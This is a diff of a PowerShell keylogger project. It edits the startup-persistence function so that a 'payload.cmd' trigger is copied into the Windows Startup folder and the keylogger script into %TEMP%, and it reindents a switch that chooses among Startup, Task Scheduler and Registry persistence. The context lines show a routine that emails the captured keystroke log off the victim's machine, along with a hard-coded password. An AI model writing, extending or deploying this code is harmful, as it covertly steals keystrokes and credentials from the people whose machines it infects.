@@ -12,8 +12,6 @@ $Password = "password"
 $validPersistanceTypes = "Startup", "TaskScheduler", "Registry", "All"
 
 
-
-
 function sendMail($logFile="$env:temp\$env:username.log") {
 	
     $Subject = "You got mail from $env:USERNAME!"
@@ -52,17 +50,15 @@ function scheduleMail($MinutesInterval=60) {
 
 function persistStartup() {
 	
-	$script = "keylogger.ps1"
 	$trigger = "payload.cmd"
-	$scriptPath = "$PWD\$script"
 	$triggerPath = "$PWD\$trigger"
-	
-	$scriptDestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$script"
-	$triggerDestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$trigger"
-	
-	Copy-Item -Path $scriptPath -Destination $scriptDestinationPath -Force
+	$triggerDestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$trigger"	
 	Copy-Item -Path $triggerPath -Destination $triggerDestinationPath -Force
 
+	$script = "keyLogger.ps1"
+	$scriptPath = "$PWD\$script"
+	$scriptDestinationPath = "$env:TEMP\$script"	
+	Copy-Item -Path $scriptPath -Destination $scriptDestinationPath -Force
 }
 
 function persistTaskScheduler() {
@@ -81,32 +77,32 @@ function persistAll() {
 
 function CreatePersistance($Type) {
 	
+	
 	switch ($Type) {
 			
-	"Startup" {
-        # Place your specific logic for Startup here
-		persistStartup
-    }
-    "TaskScheduler" {
-        # Place your specific logic for TaskScheduler here
-        persistTaskScheduler
-    }
-    "Registry" {
-        # Place your specific logic for Registry here
-        persistRegistry
-    }
-	"All" {
-        # Place your specific logic for Registry here
-        persistAll
-    }
-    default {
-        Write-Output "Unknown option selected."
-    }
-}
+		"Startup" {
+			# Place your specific logic for Startup here
+			persistStartup
+		}
+		"TaskScheduler" {
+			# Place your specific logic for TaskScheduler here
+			persistTaskScheduler
+		}
+		"Registry" {
+			# Place your specific logic for Registry here
+			persistRegistry
+		}
+		"All" {
+			# Place your specific logic for Registry here
+			persistAll
+		}
+		default {
+			Write-Output "Unknown option selected."
+		}
+	}
 	
 	
 }
-
 
 
 sendMail
